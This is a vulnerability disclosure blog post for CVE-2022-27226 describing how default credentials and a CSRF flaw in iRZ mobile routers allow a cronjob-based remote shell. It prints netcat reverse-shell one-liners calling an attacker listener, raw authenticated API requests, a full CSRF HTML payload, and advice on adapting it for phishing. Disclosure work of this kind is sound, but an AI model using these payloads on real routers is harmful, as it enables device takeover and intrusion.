<!DOCTYPE html>
<style>
    html {
        height: 100vh;
    }
    body {
        min-height: 100vh;
        display: grid;
        grid-template-rows: 1fr auto;
    }
    .footer {
        grid-row-start: 2;
        grid-row-end: 3;
    }
</style>
<html lang="en-gb"><head>
  <meta charset="utf-8">
  <title>Hack the Galaxy</title>

  <!-- mobile responsive meta -->
  <meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://johnjhacking.com/uploads/og_irz.png"/>

<meta name="twitter:title" content="CVE-2022-27226: CSRF to RCE in iRZ Mobile Routers through 2022-03-16"/>
<meta name="twitter:description" content="A CSRF issue on iRZ Mobile Routers through 2022-03-16 allows a threat actor to create a crontab entry in the router administration panel. The cronjob will consequently execute the entry on the threat actor&#39;s defined interval, leading to remote code execution, allowing the threat actor to gain file system access. In addition, if the router&#39;s default credentials aren&#39;t rotated or a threat actor discovers valid credentials, remote code execution can be achieved without user interaction."/>

  <meta property="og:title" content="CVE-2022-27226: CSRF to RCE in iRZ Mobile Routers through 2022-03-16" />
<meta property="og:description" content="A CSRF issue on iRZ Mobile Routers through 2022-03-16 allows a threat actor to create a crontab entry in the router administration panel. The cronjob will consequently execute the entry on the threat actor&#39;s defined interval, leading to remote code execution, allowing the threat actor to gain file system access. In addition, if the router&#39;s default credentials aren&#39;t rotated or a threat actor discovers valid credentials, remote code execution can be achieved without user interaction." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://johnjhacking.com/blog/cve-2022-27226/" />
<meta property="og:image" content="https://johnjhacking.com/uploads/og_irz.png" />
<meta property="article:published_time" content="2022-03-18T23:00:00+00:00" />
<meta property="article:modified_time" content="2022-03-18T23:00:00+00:00" />


  <meta name="viewport" content="width=device-width, initial-scale=1">

  <meta name="description" property="og:description" content="A CSRF issue on iRZ Mobile Routers through 2022-03-16 allows a threat actor to create a crontab entry in the router administration panel. The cronjob will consequently execute the entry on the threat actor&#39;s defined interval, leading to remote code execution, allowing the threat actor to gain file system access. In addition, if the router&#39;s default credentials aren&#39;t rotated or a threat actor discovers valid credentials, remote code execution can be achieved without user interaction.">
  <meta name="image" property="og:image" content="/">
  <meta name="author" content="John">
  <meta name="generator" content="Hugo 0.75.1" />

  <!-- plugins -->
  
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/uikit@3.2.6/dist/css/uikit.min.css ">
  

  <!-- Main Stylesheet -->
  
  <link rel="stylesheet" href="/css/style.min.css" integrity="" media="screen">
  
  <link rel="stylesheet" href="/css/syntax.min.css" integrity="" media="screen">

  <!--Favicon-->
  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
  <link rel="manifest" href="/site.webmanifest">

</head>
<body class="blog">
    <div class="wrapper"><div uk-sticky="sel-target: .uk-navbar-container; cls-active: uk-navbar-sticky; bottom: #transparent-sticky-navbar">
    <nav class="uk-navbar-container uk-margin" uk-navbar="mode: click;" style="padding-right: 3rem">
        <div class="uk-navbar-right">
            <ul class="uk-navbar-nav uk-visible@s">
                
                <li><a style="font-size: 18px; text-transform: none" href="/"> Home
                        </a></li>

                
                
                
                
                
                
                
                
                
                <li class="uk-active"><a style="font-size: 18px; text-transform:none"
                        href="/blog">Blog</a></li>
                
                
                
                
                
                
                
                
                
                <li><a style="font-size: 18px; text-transform: none" href="/research">Research</a></li>
                
                
            </ul>

            <a class="uk-navbar-toggle uk-hidden@s" uk-toggle="target: #sidenav" uk-navbar-toggle-icon href="#"></a>

        </div>
    </nav>
</div>

<div id="sidenav" uk-offcanvas="overlay: true">
    <div class="uk-offcanvas-bar uk-flex uk-flex-column">

        <ul class="uk-nav uk-nav-primary uk-nav-center uk-margin-auto-vertical">
            
            <li><a style="font-size: 18px" href="https://johnjhacking.com"> Home </a></li>

            
            
            
            
            
            
            
            
            
            <li class="uk-active"><a style="font-size: 18px" href="/blog">Blog</a></li>
            
            
            
            
            
            
            
            
            
            <li><a style="font-size: 18px" href="/research">Research</a></li>
            
            
        </ul>

    </div>
</div>

<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'G-ZL5H7Z5G9L', 'auto');
	
	ga('send', 'pageview');
}
</script>




<style>
  p {
    margin: 0
  }

  .people-wrap {
    display: inline-flex;
    margin-top: 10px;
  }

  .people-image {
    display: block;
    border-radius: 50%;
     
  }

  .people {
    margin-left: 20px;
    margin-right: 20px;
  }

  .name {
    margin: auto;
  }

  h1,
  h2,
  h3,
  h4,
  h5,
  h6 {
    color: #000;
    font-family: Roboto, sans-serif;
    line-height: 1.2;
    margin-top: 2rem;
  }

  .content img {
    box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
    display: block;
    margin-left: auto;
    margin-right: auto;
    margin-bottom:30px;
  }

  p { margin-bottom: 1em; }

  body p:last-child { margin-bottom: 0em; }

  img.skills{
    height: 80px;
  }

  @media only screen and (min-width: 960px) {
    .content img{max-width:60vw; max-height:60vh}

  .content img{
      max-width:60vw;
      max-height:60vh
  }
  }
  .content{
      width: 90vw;
      max-width: 1200px
  }

  table {
    font-family: arial, sans-serif;
    border-collapse: collapse;
    width: 100%;
  }

  td, th {
    border: 1px solid #dddddd;
    text-align: left;
    padding: 8px;
  }

</style>


<section>
  <div class="uk-container uk-margin-large-bottom uk-margin-medium-top">
    <h1 class="uk-text-center uk-heading-medium">CVE-2022-27226: CSRF to RCE in iRZ Mobile Routers through 2022-03-16</h1>
    <p class="uk-text-center uk-text-lead">A CSRF issue on iRZ Mobile Routers through 2022-03-16 allows a threat actor to create a crontab entry in the router administration panel. The cronjob will consequently execute the entry on the threat actor&#39;s defined interval, leading to remote code execution, allowing the threat actor to gain file system access. In addition, if the router&#39;s default credentials aren&#39;t rotated or a threat actor discovers valid credentials, remote code execution can be achieved without user interaction.</p>
    
    <p class="uk-text-center">Published on Mar 18, 2022</p>
    <p class="uk-text-center">Reading time: 5 minutes.</p>
    
    

    <hr class="full-width">
    

    <div class="content">
      <h1 id="credits">Credits</h1>
<p>Vulnerability Discovery</p>
<p><a href="https://github.com/johnjhacking" title="Github">John</a><br>
<a href="https://twitter.com/0xHalcyon" title="Twitter">Chris Mack</a></p>
<p>Exploit Development</p>
<p><a href="https://twitter.com/RedragonX" title="Twitter">Stephen Chavez</a><br>
<a href="https://twitter.com/rej_ex" title="Twitter">Robert Willis</a></p>
<h1 id="identification">Identification</h1>
<p>Default credentials were discovered on an iRZ Mobile Router login page. Utilizing root:root gave us access to the administrative functionality for the device. Having administrative access allows for various manipulation. Any setting that can be modified by an administrator was accessible, but the function that caught specific interest was the &ldquo;Crontabs&rdquo; feature in the services tab.</p>
<h1 id="exploiting-crontabs-for-post-authenticated-rce">Exploiting crontabs for Post Authenticated RCE</h1>
<p>The first exploit that was identified was the ability to achieve remote code execution via the router&rsquo;s native crontabs functionality. Once authenticated, we clicked on the &ldquo;+&rdquo; sign to create a new cronjob, and utilized &lsquo;*&rsquo; for each field with the following reverse shell one-liner command:</p>
<pre><code>rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 5000 &gt;/tmp/f  
</code></pre>
<p><img src="/uploads/1.png" alt=""><br>
We quckly started a listener, and caught a shell:</p>
<pre><code>nc -lvp 5000  
</code></pre><p>There was an issue though. The shell kept dying, which would happen as a result of the cronjob being rerun. Fixing this issue can be accomplished by modifying the interval to have the cronjob run at greater intervals, however we found quick success by starting two netcat listeners instead of one. Upon catching a reverse shell, we reran the reverse shell one liner to connect to another netcat listener as an orphan process.</p>
<pre><code>rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 443 &gt;/tmp/f  
</code></pre>
<p><img src="/uploads/7-2.png" alt=""><br>
Fortunately, this workaround is efficient, but the router utilizes Busybox. Even after shelling the device, Busybox makes it exceedingly difficult to keep the shell alive. With no TTY, the shell suffers from breaking while attempting to perform most actions. Therefore, after a bit of exploring it was observed that the router keeps open the telnet port and establishing tty is as simple as issuing the follow command:</p>
<pre><code>telnet 0.0.0.0
</code></pre>
<p><img src="/uploads/8-2.png" alt=""><br>
Since you have credentials, you input them via the telnet login and you have nearly full TTY. There will still be some issues, but it&rsquo;s far more stable than the initial shell that is established.</p>
<h1 id="chaining-cross-site-request-forgery-with-post-authenticated-rce">Chaining Cross Site Request Forgery with Post Authenticated RCE</h1>
<p>The administration panel for the iRZ mobile router has many flaws from an application security perspective. The lack of CORS and utilization of basic authentication on each one of the admin functions made it trivial to chain together CSRF and the previously identified RCE. If you click on the &lsquo;Services&rsquo; tab and then click on any of the administrative functions, you will prompted to enter credentials.</p>
<p><img src="/uploads/2-1.png" alt=""></p>
<p>First, an API call GET request is made to the function of the application:</p>
<pre><code>GET /api/crontab HTTP/1.1
Host: REDACTED
Accept: application/json, text/javascript
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Referer: REDACTED
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
</code></pre>
<p>Submitting the credentials results in another GET request, as the application utilizes basic authentication. The credentials are appended in the format of username:password and encoded with base64. The base64 value gets passed in the GET request in the &lsquo;Authorization&rsquo; header.</p>
<pre><code>GET /api/crontab HTTP/1.1
Host: REDACTED
Authorization: Basic cm9vdDpyb290
Accept: application/json, text/javascript
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Referer: REDACTED
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
</code></pre>
<p>Creating a CSRF proof of concept that chains together with the post authenticated RCE only required intercepting the POST request made to the API to create a cronjob entry that utilizes our reverse shell one liner in the body of the JSON. First, we created the cronjob exactly like we did previously for the post authenticated remote code execution vulnerability:</p>
<pre><code>POST /api/crontab HTTP/1.1
Host: REDACTED
Content-Length: 286
Authorization: Basic cm9vdDpyb290
Accept: application/json, text/javascript
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Content-Type: application/json
Origin: REDACTED
Referer: REDACTED
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{&quot;tasks&quot;:[{&quot;minutes&quot;:&quot;*&quot;,&quot;hours&quot;:&quot;*&quot;,&quot;days&quot;:&quot;*&quot;,&quot;months&quot;:&quot;*&quot;,&quot;weekdays&quot;:&quot;*&quot;,&quot;command&quot;:&quot;rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc LHOST LPORT &gt;/tmp/f&quot;,&quot;enable&quot;:true,&quot;system&quot;:false}],&quot;_board&quot;:{&quot;name&quot;:&quot;RU21w&quot;,&quot;platform&quot;:&quot;irz_mt02&quot;,&quot;time&quot;:&quot;Fri Mar 18 23:32:12 UTC 2022&quot;}}
</code></pre>
<p>Right clicking on this intercepted request, we generated a CSRF proof of concept in Burpsuite:</p>
<pre><code>&lt;html&gt;
  &lt;body&gt;
  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;
    &lt;form action=&quot;http://{VICTIMHOST}/api/crontab&quot; method=&quot;POST&quot; enctype=&quot;text/plain&quot;&gt;
      &lt;input type=&quot;hidden&quot; name=&quot;&amp;#123;&amp;quot;tasks&amp;quot;&amp;#58;&amp;#91;&amp;#123;&amp;quot;minutes&amp;quot;&amp;#58;&amp;quot;&amp;#42;&amp;quot;&amp;#44;&amp;quot;hours&amp;quot;&amp;#58;&amp;quot;&amp;#42;&amp;quot;&amp;#44;&amp;quot;days&amp;quot;&amp;#58;&amp;quot;&amp;#42;&amp;quot;&amp;#44;&amp;quot;months&amp;quot;&amp;#58;&amp;quot;&amp;#42;&amp;quot;&amp;#44;&amp;quot;weekdays&amp;quot;&amp;#58;&amp;quot;&amp;#42;&amp;quot;&amp;#44;&amp;quot;command&amp;quot;&amp;#58;&amp;quot;rm&amp;#32;&amp;#47;tmp&amp;#47;f&amp;#59;mknod&amp;#32;&amp;#47;tmp&amp;#47;f&amp;#32;p&amp;#59;cat&amp;#32;&amp;#47;tmp&amp;#47;f&amp;#124;&amp;#47;bin&amp;#47;sh&amp;#32;&amp;#45;i&amp;#32;2&amp;gt;&amp;amp;1&amp;#124;nc&amp;#32;{LHOST-octet-1}&amp;#46;{LHOST-octet-2}&amp;#46;{LHOST-octet-3}&amp;#46;{LHOST-octet-4}&amp;#32;{LPORT}&amp;#32;&amp;gt;&amp;#47;tmp&amp;#47;f&amp;quot;&amp;#44;&amp;quot;enable&amp;quot;&amp;#58;true&amp;#44;&amp;quot;system&amp;quot;&amp;#58;false&amp;#125;&amp;#93;&amp;#44;&amp;quot;&amp;#95;board&amp;quot;&amp;#58;&amp;#123;&amp;quot;name&amp;quot;&amp;#58;&amp;quot;RU21w&amp;quot;&amp;#44;&amp;quot;platform&amp;quot;&amp;#58;&amp;quot;irz&amp;#95;mt02&amp;quot;&amp;#44;&amp;quot;time&amp;quot;&amp;#58;&amp;quot;Fri&amp;#32;Mar&amp;#32;18&amp;#32;23&amp;#58;32&amp;#58;12&amp;#32;UTC&amp;#32;2022&amp;quot;&amp;#125;&amp;#125;&quot; value=&quot;&quot; /&gt;
      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;
    &lt;/form&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>Since iRZ Mobile Routers utilize basic authentication prior to accessing each administrative function, the CSRF proof of concept works well against both authenticated and unauthenticated users.</p>
<p>We hosted the CSRF payload on a server:</p>
<p><img src="/uploads/3-2.png" alt=""></p>
<p>Then, we tested the CSRF against both authenticated and unauthenticated users and observed the following:</p>
<ol>
<li>
<p>Authenticated users that click the CSRF proof of concept button immediately make a POST request to the crontab API, and are served a blank page.</p>
</li>
<li>
<p>Unauthenticated users that click the CSRF proof of concept button are prompted to login by the victim server, which gives legitimaticy to the pretexting of a user with the  CSRF template. When they authenticate, the POST request is sent to the crontab API, and they are served a blank page.</p>
<p><img src="/uploads/4-2.png" alt=""><br>
<img src="/uploads/5-2.png" alt=""><br>
Navigating back to the application, the successful entry of a cronjob to the crontabs section of the application is visible:</p>
<p><img src="/uploads/6-2.png" alt=""></p>
</li>
</ol>
<h1 id="developing-an-exploit">Developing an exploit</h1>
<p>Having to go through the process of manually generating the CSRF can take awhile, therefore we decided it would be smart to template this process. With our exploit ez-iRZ, a user can pick from two different exploit workflows. If a post-authenticated workflow is chosen, the credentials that the attack enters will be encoded to base64 and passed to the Authorization header. The request will be sent to the API, utilizing a standard cronjob request with pre-filled LHOST, LPORT and a reverse-shell one liner command.</p>
<p>The CSRF workflow utilizes similar methodology, minus the requirement to provide credentials. It&rsquo;s recommended that a more comprehensive CSRF template is made if this exploit is utilized for a serious phishing campaign, such as cloning the specific HTML from the victim&rsquo;s router - as the device can vary. The script will generate a basic CSRF template that an attacker can host on their server and send to a victim to achieve remote code execution.</p>
<p>Initially we had thought that the device name in the JSON body would have to be changed for the CSRF to work, however, we noted that this is not the case. The CSRF template works against all models of the iRZ Mobile Routers.</p>
<h1 id="exploit">Exploit</h1>
<p><a href="https://github.com/SakuraSamuraii/ez-iRZ" title="https://github.com/SakuraSamuraii/ez-iRZ">https://github.com/SakuraSamuraii/ez-iRZ</a></p>

    </div>
  </div>
  </div>
</section>



    </div>
<footer class="footer">
  <div class="uk-container">


    <div class="uk-grid-small uk-text-center uk-flex-center uk-margin-medium-bottom">
      <div class="uk-margin-small-bottom">
       

      </div>
      
    </div>





  <div class="footer-copyright uk-text-center" style="padding-bottom: 1rem">
    <img loading="lazy" src="https://mirrors.creativecommons.org/presskit/icons/cc.svg" style="height: 1.2em;
  width: 1.2em;" alt="Creative Commons">
    <img loading="lazy" src="https://mirrors.creativecommons.org/presskit/icons/by.svg" style="height: 1.2em;
  width: 1.2em;" alt="CC-BY">
    2020
    John


  </div>
</footer>


<!-- JS Plugins -->

<script src="https://cdn.jsdelivr.net/npm/uikit@3.2.6/dist/js/uikit.min.js"></script>

<script src="https://cdn.jsdelivr.net/npm/uikit@3.2.6/dist/js/uikit-icons.min.js"></script>

</body>
</html>
